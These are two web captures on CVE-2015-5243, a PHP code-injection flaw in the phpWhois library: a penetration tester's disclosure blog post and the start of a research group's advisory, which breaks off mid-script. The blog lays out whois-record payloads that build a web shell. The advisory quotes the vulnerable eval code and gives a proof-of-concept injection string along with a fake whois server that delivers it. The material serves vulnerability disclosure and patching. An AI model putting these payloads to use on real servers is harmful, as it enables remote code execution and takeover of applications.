=== Content from blog.nettitude.com_091db125_20250125_044242.html ===


[Skip content](#content)

Global (English)

* [About us](/en/who-we-are/)
* [Client login](/en/client-portal/)
* [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)
* [Contact us](/en/contact-us/)

[Logo](/en/)

Menu

Close

* Assurance 4.0

  + Back
  + [Assurance 4.0](/en/who-we-are/assurance-4/)
  + [Assure Assets and Management Systems](/en/assure-assets-and-management-systems/)
  + [Achieve Product Integrity](/en/achieve-product-integrity/)
  + [Source Responsibly](/en/source-responsibly/)
  + [Navigate the Energy Transition and Achieve Net Zero](/en/navigate-the-energy-transition-and-achieve-net-zero/)
  + [Strengthen Cyber Security Maturity](/en/strengthen-cybersecurity-maturity/)
* Sectors

  + Back
  + [Sectors](/en/sectors/)
  + [Food and Beverage](/en/food-beverage-hospitality/)
  + [Financial and Professional Services](/en/financial-and-professional-services/)
  + [Energy and Renewables](/en/energy-renewables/)
  + [Transportation and Mobility](/en/transport-logistics/)
  + [Technology and Telecommunications](/en/ict-telecoms/)
  + [Consumer Goods and Retail](/en/consumer-goods-and-retail/)
  + [Construction and Engineering](/en/construction-industry/)
  + [Healthcare and Medical](/en/healthcare-medical/)
  + [Can't see your sector?](/en/contact-us/)
* Services

  + Back
  + [Services](/en/services/)
  + Assessment and Certification

    - Back
    - [Assessment and Certification](/en/assessment-certification/)
    - [Transfer your Certification to LRQA](/en/transfer-certification-to-lrqa/)
    - Quality, Environment, Health and Safety

      * Back
      * [Quality, Environment, Health and Safety](/en/quality-health-and-safety-and-environmental/)
      * [ISO 9001 Certification](/en/iso-9001/)
      * [ISO 14001 Certification](/en/iso-14001/)
      * [ISO 45001 Certification](/en/iso-45001/)
    - Food and Beverage

      * Back
      * [Food and Beverage](/en/food-beverage-hospitality/)
      * [FSSC 22000 Certification](/en/fssc-22000/)
      * [BRCGS Certification](/en/brcgs-food-safety/)
      * [2nd Party Audits](/en/2nd-party-audit-programmes/)
      * [ISO 22000 Certification](/en/iso-22000/)
      * [IFS Certification](/en/ifs/)
      * [SQF Certification](/en/sqf-certification/)
      * [HACCP Certification](/en/haccp/)
      * [Food Labelling](/en/food-labelling-regulation-advisory-services/)
      * [GSA BAP Certification](/en/gsa-bap/)
      * [MSC Certification](/en/msc/)
      * [ASC Certification](/en/asc/)
    - Sustainability and Responsible Sourcing

      * Back
      * [Sustainability and Responsible Sourcing](/en/climate-change-sustainability/)
      * [ISO 14064 Certification](/en/iso-14064/)
      * [ISO 50001 Certification](/en/iso-50001/)
      * [ISO 46001 Certification](/en/iso-46001/)
      * [Sedex Members Ethical Trade Audit (SMETA)](/en/smeta/)
      * [Amfori BSCI](/en/amfori-bsci-business-social-compliance-initiative/)
      * [Farm First](/en/farm-first-assurance-scheme/)
      * [ERSA](/en/ersa-responsible-sourcing-assessment/)
      * [Social and Labour Convergence Programme (SLCP)](/en/social-labour-convergence-program-slcp/)
      * [Initiative for Compliance and Sustainability (ICS)](/en/initiative-for-compliance-and-sustainability/)
      * [Responsible Business Alliance - Validated Assessment Program (RBA-VAP)](/en/rba-vap-validated-assessment-program/)
      * [Worldwide Responsible Accredited Production (WRAP)](/en/worldwide-responsible-accredited-production/)
      * [EU ETS](/en/eu-ets/)
      * [Responsible Plastic Management](/en/responsible-plastic-management/)
    - Information Security Management

      * Back
      * [Information Security Management](/en/information-security-management/)
      * [ISO 27001 Certification](/en/iso-27001/)
      * [ISO 27701 Certification](/en/iso-27701/)
      * [ISO 20000-1 Certification](/en/iso-20000/)
      * [ISO 22301 Certification](/en/iso-22301/)
      * [CSA STAR Certification](/en/csa-star/)
      * [ISO 42001 Certification](/en/iso-42001-ai-management-system-certification/)
    - Automotive and Aerospace

      * Back
      * [Automotive and Aerospace](/en/automotive-aerospace/)
      * [IATF 16949 Certification](/en/iatf-16949/)
      * [AS 9100 Certification](/en/as9100/)
    - [Medical - ISO 13485 Certification](/en/iso-13485/)
    - [Oil and Gas - ISO 29001 Certification](/en/iso-29001/)
    - [Client-Specific Programmes](/en/client-specific-programmes/)
    - [LRQA Worker Surveys](/en/lrqa-worker-surveys/)
  + Inspection Services

    - Back
    - [Inspection Services](/en/inspection-services/)
    - Product, System and Process Certification

      * Back
      * [Product, System and Process Certification](/en/codes-standards-regulations/)
      * [ASME](/en/asme-code-services/)
      * [Pressure Equipment Directive (PED)](/en/pressure-equipment-directive/)
      * [National Approvals](/en/product-certification/national-approvals/)
      * [EU Directives](/en/product-certification/ce-marking-and-eu-directives/)
    - Welding and Material Services

      * Back
      * [Welding and Material Services](/en/materials-and-welding/)
      * [EN 10204 Type 3.2](/en/materials-and-welding/en-10204-type-3-2-certification-services/)
      * [ISO 3834 Certification](/en/materials-and-welding/iso-3834/)
      * [Welding Procedure and Welder Operator Qualification](/en/materials-and-welding/welding-operator-qualification/)
    - [Container Certification](/en/containers/)
    - [Type Approval](/en/product-certification/type-approval/)
    - [Utilities Schemes](/en/utilities/)
    - Construction Scheme

      * Back
      * [Construction Scheme](/en/construction-industry/)
      * [BIM and ISO 19650](/en/construction-industry/building-information-modelling-bim/)
      * [BOPAS](/en/construction-industry/buildoffsite-property-assurance-scheme-bopas/)
      * [Construction Products Regulation (CPR)](/en/construction-products-regulation/)
    - Energy Transition Services

      * Back
      * [Energy Transition Services](/en/energy-transition-services/)
      * [Hydrogen Projects](/en/hydrogen-net-zero-manufacturing/)
      * [Nuclear Projects](/en/nuclear-supply-chain-inspection/)
      * [Solar Projects](/en/solar-projects-assurance/)
      * [Wind Projects](/en/wind-projects-assurance/)
    - Technical Advisory

      * Back
      * Technical Advisory
      * [Additive Manufacturing](/en/additive-manufacturing/)
      * [Other Technical Advisory Services](/en/technical-advisory-services/)
    - Supply Chain and Vendor Inspection

      * Back
      * [Supply Chain and Vendor Inspection](/en/supply-chain-inspection/)
      * [Cranes and Lifting Equipment](/en/manufacturing-industry/cranes-lifting-equipment/)
    - [Remote Inspection](/en/remote-inspection/)
  + Cyber Security Services

    - Back
    - [Cyber Security Services](/en/cyber-security-services/)
    - [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)
    - Cyber Advisory

      * Back
      * [Cyber Advisory](/en/cyber-security-advisory-services/)
      * [Threat Intelligence Services](/en/threat-intelligence-services/)
      * [Virtual CISO Services](/en/virtual-ciso/)
      * [ThreatWatcher](/en/threatwatcher/)
      * [Threat Modelling](/en/threat-modelling/)
      * [Regulatory Compliance Testing](/en/regulatory-compliance-testing/)
      * [Red Teaming](/en/red-teaming/)
      * [Purple Teaming](/en/purple-teaming/)
      * [Cyber Security Maturity Assessment](/en/cyber-security-maturity-assessment/)
      * [Merger and Aquisitions Due Diligence](/en/mergers-and-acquisition-due-diligence/)
      * [Offensive Cyber Security Training](/en/offensive-cyber-security-training/)
    - Governance, Risk and Compliance

      * Back
      * [Governance, Risk and Compliance](/en/governance-risk-compliance-services/)
      * [PCI DSS Consultancy and Assessments](/en/pci-dss-assessments/)
      * [Security Awareness Training](/en/security-awareness-training/)
      * [DORA Compliance](/en/dora-compliance/)
      * [ISO 27001 Certification](/en/iso-27001/)
      * [NIST Cyber Security Framework](/en/nist-cyber-security-framework/)
      * [NCSC 10 Steps to Cyber Security](/en/ncsc-ten-steps-to-cyber-security-assessment/)
      * [CAA ASSURE Cyber Audit](/en/caa-assure-cyber-audit/)
      * [Vendor Security Review](/en/vendor-security-review/)
      * [Policies Procedures Creation and Review](/en/policies-procedures-creation-review/)
      * [Cyber Essentials Certification](/en/cyber-essentials-certification/)
      * [Cyber Security Risk Assessment](/en/cyber-security-risk-assessment/)
      * [Cloud Security and Privacy](/en/information-security-management/)
      * [CMMC Compliance](/en/cmmc-compliance/)
    - Managed Cyber Security Services

      * Back
      * [Managed Cyber Security Services](/en/managed-security-services/)
      * [SOC-as-a-Service (SOCaaS)](/en/soc-as-a-service/)
      * [Network Detection and Response (NDR)](/en/network-detection-and-response/)
      * [Extended Detection and Response (XDR)](/en/extended-detection-and-response/)
      * [Managed Detection and Response (MDR)](/en/managed-detection-and-response/)
      * [Security Information and Event Management (SIEM)](/en/security-information-and-event-management-siem-services/)
      * [Endpoint Detection and Response (EDR)](/en/endpoint-detection-and-response/)
      * [Virtual CISO Services](/en/virtual-ciso/)
      * [Digital Forensics and Incident Response](/en/digital-forensics-and-incident-response/)
      * [Vulnerability Scanning](/en/managed-vulnerability-scanning/)
    - Incident Response

      * Back
      * [Incident Response](/en/incident-response-services/)
      * [Digital Forensics and Incident Response](/en/digital-forensics-and-incident-response/)
      * [Emergency Incident Response](/en/emergency-incident-response-services/)
    - Cyber Security Testing

      * Back
      * [Cyber Security Testing](/en/cyber-security-testing/)
      * [Penetration Testing Services](/en/penetration-testing/)
      * [Web Application Penetration Testing](/en/web-application-penetration-testing/)
      * [Mobile Application Penetration Testing](/en/mobile-application-penetration-testing/)
      * [Cloud Penetration Testing](/en/cloud-penetration-testing/)
      * [Continuous Assurance](/en/continuous-assurance/)
      * [Red Teaming](/en/red-teaming/)
      * [Purple Teaming](/en/purple-teaming/)
      * [Social Engineering](/en/social-engineering/)
      * [Bug Bounty Program](/en/bug-bounty-program/)
    - Cyber Insurance Services

      * Back
      * Cyber Insurance Services
      * [Cyber Insurance Partner](/en/cyber-insurance-service-partner/)
      * [Cyber Insurance](/en/cyber-insurance-services/)
  + Verification and Report Assurance

    - Back
    - [Verification and Report Assurance](/en/assurance-services/)
    - [CSRD](/en/csrd/)
    - [Organisational GHG and Carbon Verification](/en/organisational-ghg-carbon-verification/)
    - [Environmental and Social Verification](/en/environmental-social-verification/)
    - [Product Carbon Footprinting](/en/product-carbon-footprinting/)
    - [Carbon Neutrality](/en/carbon-neutrality/)
    - [Regulatory Emission Schemes](/en/regulatory-emission-schemes/)
    - [Sector Carbon Standards](/en/sector-carbon-standards/)
  + Training

    - Back
    - Training
    - All Training Courses

      * Back
      * [All Training Courses](/en/training/overview/)
      * [Quality, Environment, Health and Safety Training](/en/training/quality-environmental-health-and-safety/)
      * [Food, Beverage and Hospitality Training](/en/training/food-beverage-hospitality/)
      * [Medical Devices Training](/en/training/medical-devices/)
      * [Cybersecurity and Information Security Training](/en/training/infosecurity-cyber/)
      * [Climate Change and Sustainability Training](/en/training/climate-change-sustainability/)
      * [Automotive, Aerospace and Transport Training](/en/training/automotive-aerospace/)
      * [Manufacturing Codes and Standards Training](/en/training/manufacturing/)
    - Online Training

      * Back
      * [Online Training](/en/training/virtual-classroom-online-courses/)
      * [Virtual Classroom Courses](/en/training/virtual-classroom-courses/)
      * [eLearning](/en/training/elearning-courses/)
      * [Blended Training](/en/training/blended/)
    - [LRQA Training Academy](/en/training-academy/)
    - [Management System Solutions](/en/management-system-solutions/)
    - [Training Portal](https://training-portal.lrqa.com/lmt/clmsbrowsev2.prmain?site=lrqaext&in_lang=en&in_region=gl)
  + Advisory Services

    - Back
    - [Advisory Services](/en/advisory-services/)
    - [ESG Advisory](/en/esg-advisory/)
    - [CSDDD](/en/csddd/)
    - [CSRD](/en/csrd/)
    - Diagnostics

      * Back
      * [Diagnostics](/en/diagnostics/)
      * [Responsible Sourcing](/en/responsible-sourcing-in-supply-chains/)
      * [Human Rights Impact Assessment (HRIA)](/en/human-rights-impact-assessment/)
      * [Net Zero](/en/net-zero-climate-risk-service/)
      * [Double Materiality](/en/double-materiality-assessment/)
    - Strategy and Design

      * Back
      * [Strategy and Design](/en/strategy-and-design/)
      * [Supply Chain Risk Assessment and Segmentation](/en/supply-chain-risk-assessment-segmentation-service/)
      * [Carbon Footprint and Decarbonisation Strategy](/en/corporate-decarbonisation-strategy/)
      * [Safety Culture Ladder](/en/safety-culture-ladder/)
    - Implementation

      * Back
      * [Implementation](/en/implementation/)
      * [Grievance Mechanism](/en/grievance-mechanism/)
      * [GHG Inventory](/en/ghg-inventory-service/)
      * [Waste and Emissions Supply Chain Engagement](/en/waste-and-emissions-supply-chain-engagement/)
    - Reporting and Disclosure

      * Back
      * [Reporting and Disclosure](/en/reporting-and-disclosure/)
      * [Climate Disclosure](/en/climate-disclosure-service/)
      * [Sustainability Disclosure](/en/sustainability-disclosure/)
    - [Programme Management](/en/programme-management/)
    - [Technical Advisory](/en/technical-advisory-services/)
    - Training

      * Back
      * Training
      * [All Training Courses](/en/training/overview/)
      * [Online Training](/en/training/virtual-classroom-online-courses/)
      * [Management System Solutions](/en/management-system-solutions/)
      * [Training Portal](https://training-portal.lrqa.com/lmt/clmsbrowsev2.prmain?site=lrqaext&in_lang=en&in_region=gl)
    - [Management System Solutions](/en/management-system-solutions/)
    - [LRQA Worker Surveys](/en/lrqa-worker-surveys/)
  + Data and Analytics

    - Back
    - Data and Analytics
    - [LRQA's EiQ Platform](https://www.eiq.ai/)
    - [EiQ Lite](/en/eiq-lite/)
  + [Can't find the service you need?](/en/contact-us/)
* News and Insights

  + Back
  + News and Insights
  + [Latest News](/en/latest-news/)
  + [Thought Leadership Articles](/en/insights/articles/)
  + [Cyber Labs](/en/cyber-labs/)
  + [Case Studies](/en/case-studies/)
  + [Podcasts](/en/podcasts/)
  + [Downloadable Resources](/en/resources/)
  + [Legislation Map](/en/supply-chain-due-diligence-legislation-map/)
  + [Client Information Notes (CINs)](/en/resources/client-information-note/)
  + [Accreditations](/en/who-we-are/our-management-systems-accreditations/)
  + [Hall of fame](/nl-nl/case-studies/hall-of-fame/)
  + [Awards and Recognition](/en/who-we-are/awards-and-recognition/)
* [Events and Webinars](/en/events/)
* Careers

  + Back
  + [Careers](/en/careers/)
  + [What it's like to work here](/en/why-lrqa/)
  + [From application to onboarding](/en/career-faqs/)
  + Talent Community

    - Back
    - [Talent Community](/en/opportunities/)
    - [Assessment roles](/en/opportunities/assessment-roles/)
    - [Inspection Service roles](/en/opportunities/inspection-service-roles/)
    - [Cybersecurity roles](/en/opportunities/cybersecurity-roles/)
    - [Advisory and ESG roles](/en/opportunities/advisory-and-esg-roles/)
    - [Sales and Business Development roles](/en/opportunities/sales-roles/)
    - [Contractor roles](/en/opportunities/contractor-roles/)
    - [Corporate Function roles](/en/opportunities/corporate-function-roles/)
  + Apply now

    - Back
    - Apply now
    - [Advisory and ESG roles](https://elevatelimited.bamboohr.com/careers)
    - [All other roles](https://jobs.lrqa.com/)
* [About us](/en/who-we-are/)
* [Client login](/en/client-portal/)
* [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)

Search

Close

Search form
Search open

Search

Are you looking for?

* [Events](/en/events/)
* [News](/en/latest-news/)
* [Case studies](/en/case-studies/)
* [Resource library](/en/resources/)
* [Client Portal](/en/client-portal/)
* [Client Information Notes](/en/resources/client-information-note/)

You are here:

1. [Home](/en/)
2. [Insights](/en/insights/)
3. [Articles

   Back to previous page](/en/insights/articles/)
4. **CVE-2015-5243 phpwhois remote code execution**

![](/static/assets/search-grey.svg)
# CVE-2015-5243 phpwhois remote code execution

###

### **Subscribe** to our newsletter

Stay ahead with the latest news and insights that matter to your business.

[Sign up](/en/sign-up-newsletters/?epslanguage=en "Sign up")

**Malicious input can come from unexpected places.**

On a recent web application test I found functionality which parsed user submitted data for URLs. In the background, the application performed a lookup of the “whois” data for the host portion of that URL using the “phpWhois” library.

 Figure 1 - A whois record

As there is no standard format for whois data, one of the advantages of using a library such as phpWhois is that it parses all possible whois formats and outputs them in a uniform manner so that for example, if you specifically wanted to extract the technical contact email for a domain, this could be done easily by referring to a key called “technical\_contact\_email”.

phpWhois returns the detailed information contained within a whois record by constructing a relatively complex data structure consisting of a keyed multidimensional array of values. The below screenshot shows a section of returned data which shows contact information for the “tech” contact of a domain.

 Figure 2 - A whois record parsed by phpWhois

Unfortunately, in order to construct these complex data structures, phpWhois uses a very risky built-in PHP function called “eval”. This function will evaluate any execute any PHP code passed to it, but by allowing untrusted data to pass into this function, PHP developers often open themselves up to attackers being able to run any code they wish.

 Figure 3 - The vulnerable line of code in phpWhois

For phpWhois, the untrusted data being passed to the “eval” function is a line of a “whois” record. The library loops over each line, adding the record data into an evaluated statement as a string. In order to ensure that the record data is a string and that it can’t be prematurely terminated in order to achieve code execution, any double quotes are escaped using a backslash (‘’) character. This means that the “eval” function sees the double quote only as a string literal double quote and not the end of the string.

This is the only protection in place to ensure that untrusted data is not executed by PHP and unfortunately it can be bypassed simply by starting a whois line with a backslash, then a double quote (‘”’). This tricks PHP into assuming the backslash added by the library is a string literal backslash and that the quote is the real end of a string. Everything after that is parsed as executable code.

| Input | Parsed as | Example | Output |
| --- | --- | --- | --- |
| “ | ” | eval(“$x=”””) | $x is ‘”’ |
| ” | \” | eval(“$x=”\””); | $x is ‘’ |
| ”;phpinfo();// | \”;phpinfo();// | eval(“$x=”\”;phpinfo();//”); | $x is ‘’ phpinfo() function is executed |

After testing this out, I identified that the execution path required to reach this section of code only applied to a small subset of top level domains, including “.info”. In order to execute valid PHP code, I needed to work around the constraints: 1. Each free-text field was a maximum of 60 chars 2. Angle brackets (<>) were stripped out by my hosting provider 3. Single and double quotes were escaped, so needed to be avoided I was then able to register a “.info” domain and propagate its whois record with malicious data by starting each free-text field with an escaped quote (”) and ending it with a PHP single-line comment (//): I was then able to register a “.info” domain and propagate its whois record with malicious data by starting each free-text field with an escaped quote (”) and ending it with a PHP single-line comment (//):

 Figure 4 - A malicious payload in a whois record

The malicious whois data does a number of things:

| Command | Description |
| --- | --- |
| phpinfo(); | Output detailed PHP configuration information. This also acts to show if the script has successfully executed in the response of the application |
| `find . –writable|tee –a /tmp/w`; | This finds all writable locations within the web root and writes the list to /tmp/w using “tee”. In PHP, any code between backticks (`) is executed as an operating system command. |
| $f=chr(99)… etc | I build the name of a PHP file up using the chr() function as I can’t construct strings using single or double quotes. This is stored in the variable, $f |
| `echo –n PD9waHANCg==|base64 –d|tee –a $f`Etc | This starts to build up a PHP “web shell” backdoor and write it to the filename in $f. I’m using base64 code so that I’m not limited in the characters I can pass. This line writes “<?php” to the file. Subsequent lines create the rest of the web shell by writing:  echo  `$\_GET[c][/c]`;  ?> |

After phpWhois has parsed this record, it should have written a “web shell” into the application path. This can then be accessed by passing operating system commands to the URL parameter ‘c’.

Table 4 - After parsing the malicious whois record, a web shell is written to the application

Once the web shell was installed, I had unfettered access to the application source code and database, the underlying operating system and could use the web server as a pivot into the internal network.

This vulnerable code was found to be present in both the [original phpWhois on Sourceforge](http://sourceforge.net/projects/phpwhois/) and [a newer fork of phpWhois on GitHub](https://github.com/phpWhois/phpWhois). Developers for both projects have been contacted. The Sourceforge project has a fix already in place.

Often when we think about malicious input to a web application, we consider only data that is being sent with the request itself, however as this attack shows, any external input consumed by an application could be used to attack it.

**Vulnerability Timeline**

1. 2015-08-25 Vulnerability Identified in phpWhois
2. 2015-08-28 CVE number applied for and author of GitHub fork of project notified
3. 2015-08-29 CVE-2015-5243 assigned
4. 2015-09-02 Github project owner notified a second time
5. 2015-09-03 Authors of Sourceforge project notified
6. 2015-09-09 Sourceforce project code repository updated with a fix
7. 2015-09-30 Github project owner notified a third time
8. 2015-12-02 Public disclosure by Nettitude

To contact Nettitude’s editor, please email media@nettitude.com

![](/cdn-cgi/image/width=120,format=auto/globalassets/logos/lrqa-white-logo---dark-background-cropped.png)

* [![](/cdn-cgi/image/width=20,format=auto/globalassets/_shared-images/twitter2.png)](https://twitter.com/lrqa)
* [![LinkedIn icon in mint green](/cdn-cgi/image/width=20,format=auto/globalassets/_shared-images/linkedin-icon-1.png)](https://www.linkedin.com/company/lrqa)

* [Who we are](/en/who-we-are/)
* [Careers](/en/careers/)
* [Resources](/en/resources/)

LRQA and any variants are trading names of LRQA Group Limited, its subsidiaries and affiliates. LRQA Group Limited, registered number 1217474, is a limited company registered in England and Wales. Registered office: 1, Trinity Park, Bickenhill Lane, Birmingham B37 7ES. © 2024 LRQA Group Limited.

* [Privacy notice](/en/privacy-notice/)
* [Cookie Policy](/en/cookies-policy/)
* [Terms of use](/en/terms-of-use/)
* [Modern Slavery Statement](/en/who-we-are/modern-slavery/)
* [Governance](/en/who-we-are/governance-policies/)



=== Content from github.com_1efcd508_20250125_044246.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsbaresearch%2Fadvisories%2Ftree%2Fpublic%2F2018%2FSBA-ADV-20180425-01_phpWhois_Code_Execution)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsbaresearch%2Fadvisories%2Ftree%2Fpublic%2F2018%2FSBA-ADV-20180425-01_phpWhois_Code_Execution)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=sbaresearch%2Fadvisories)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sbaresearch](/sbaresearch)
/
**[advisories](/sbaresearch/advisories)**
Public

* [Notifications](/login?return_to=%2Fsbaresearch%2Fadvisories) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2Fsbaresearch%2Fadvisories)
* [Star
   22](/login?return_to=%2Fsbaresearch%2Fadvisories)

* [Code](/sbaresearch/advisories)
* [Issues
  0](/sbaresearch/advisories/issues)
* [Pull requests
  0](/sbaresearch/advisories/pulls)
* [Actions](/sbaresearch/advisories/actions)
* [Projects
  0](/sbaresearch/advisories/projects)
* [Security](/sbaresearch/advisories/security)
* [Insights](/sbaresearch/advisories/pulse)

Additional navigation options

* [Code](/sbaresearch/advisories)
* [Issues](/sbaresearch/advisories/issues)
* [Pull requests](/sbaresearch/advisories/pulls)
* [Actions](/sbaresearch/advisories/actions)
* [Projects](/sbaresearch/advisories/projects)
* [Security](/sbaresearch/advisories/security)
* [Insights](/sbaresearch/advisories/pulse)

## Files

 public
## Breadcrumbs

1. [advisories](/sbaresearch/advisories/tree/public)
2. /[2018](/sbaresearch/advisories/tree/public/2018)
/
# SBA-ADV-20180425-01\_phpWhois\_Code\_Execution

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/sbaresearch/advisories/commits/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution) public
## Breadcrumbs

1. [advisories](/sbaresearch/advisories/tree/public)
2. /[2018](/sbaresearch/advisories/tree/public/2018)
/
# SBA-ADV-20180425-01\_phpWhois\_Code\_Execution

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/sbaresearch/advisories/tree/public/2018) | | |
| [README.md](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/README.md "README.md") | | [README.md](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/README.md "README.md") |  |  |
| [composer.json](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/composer.json "composer.json") | | [composer.json](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/composer.json "composer.json") |  |  |
| [poc.php](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/poc.php "poc.php") | | [poc.php](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/poc.php "poc.php") |  |  |
| [pocserver.py](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/pocserver.py "pocserver.py") | | [pocserver.py](/sbaresearch/advisories/blob/public/2018/SBA-ADV-20180425-01_phpWhois_Code_Execution/pocserver.py "pocserver.py") |  |  |
| View all files | | |

## [README.md](#readme)

# phpWhois PHP Code Injection

## Vulnerability Overview

phpWhois and some of its forks in versions before 5.1.0 are prone to a
code injection vulnerability due to insufficient sanitization of returned
WHOIS data. This allows attackers controlling the WHOIS information of a
requested domain to execute arbitrary PHP code in the context of the
application.

* **Identifier** : SBA-ADV-20180425-01
* **Type of Vulnerability** : Code Injection
* **Software/Product Name** : phpWhois
* **Vendor** : [phpwhois.org](http://www.phpwhois.org/),
  [abcdmitry](https://github.com/phpWhois/phpWhois),
  [jsmitty12](https://github.com/jsmitty12/phpWhois),
  [webalternative](https://github.com/webalternative/phpWhois)
  and others
* **Affected Versions** : phpwhois.org: 4.2.2 and probably prior,
  as well as the following forks
  abcdmitry: 4.2.5 and probably prior,
  jsmitty12: 5.0.2 and probably prior
* **Fixed in Version** : jsmitty12: 5.1.0
* **CVE ID** : CVE-2015-5243
* **CVSSv3 Vector** : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
* **CVSSv3 Base Score** : 9.8 (Critical)

## Vendor Description

> This package contains a Whois (RFC954) library for PHP. It allows a
> PHP program to create a Whois object, and obtain the output of a
> whois query with the lookup function.

Source: <https://github.com/phpWhois/phpWhois>

## Impact

By exploiting the vulnerability documented in this advisory, an
attacker controlling the WHOIS information of a domain retrieved via
phpWhois can execute arbitrary PHP code in the context of the
application. The set of domains enabling this attack vector is limited
to certain top-level domains. Sensitive data accessible by the
application might get exposed through this attack.

The vulnerability is fixed in version 5.1.0 or newer of jsmitty12's fork.
We recommend upgrading to this version.

## Vulnerability Description

phpWhois implements multiple generic parsers for WHOIS data in
`whois.parser.php`. The parser implemented in function
`generic_parser_b` is vulnerable to injection of PHP code.

The function `generic_parser_b` builds a PHP statement from WHOIS data
values by concatenating strings without proper sanitization. It then
passes the statement to the `eval` function:

```
function generic_parser_b($rawdata, $items = array(), $dateformat = 'mdy', $hasreg = true, $scanall = false) {
[...]
    foreach ($rawdata as $val) {
        if (trim($val) != '') {
            if (($val[0] == '%' || $val[0] == '#') && $disok) {
                $r['disclaimer'][] = trim(substr($val, 1));
                $disok = true;
                continue;
            }
            $disok = false;
            reset($items);
            foreach ($items as $match => $field) {
                $pos = strpos($val, $match);
                if ($pos !== false) {
                    if ($field != '') {
                        $var = '$r' . getvarname($field);
                        $itm = trim(substr($val, $pos + strlen($match)));
                        if ($itm != '')
                            eval($var . '="' . str_replace('"', '\"', $itm) . '";');
                    }
                    if (!$scanall)
                        break;
                }
            }
        }
[...]
}
```

At least the following 33 top-level domain handlers make use of the
vulnerable parser:

```
ae, aero, ag, asia, au, bh, biz, cat, cn, co, co.za, fi, hu, in, info, jp, lu, me, mobi, museum, name, nz, org, pro, ru, sc, se, su, tel, travel, us, ws, xxx

```

## Proof-of-Concept

An attacker can exploit this vulnerability by setting malicious WHOIS
information such as `Registrant Name: ${passthru('id')}` for an arbitrary
`.org` domain.
Instead of a real name, we specify `${passthru('id')}` which PHP will
interpret as a variable expansion inside double quoted string literals.
We simulate this situation via a simple WHOIS server implementation:

```
import SocketServer

DATA = "Registrant Name: ${passthru('id')}\n"

class WhoisHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        self.request.recv(1024)
        print('Request received')
        self.request.sendall(DATA)
        print('Payload sent')

if __name__ == '__main__':
    SocketServer.ThreadingTCPServer.allow_reuse_address = True
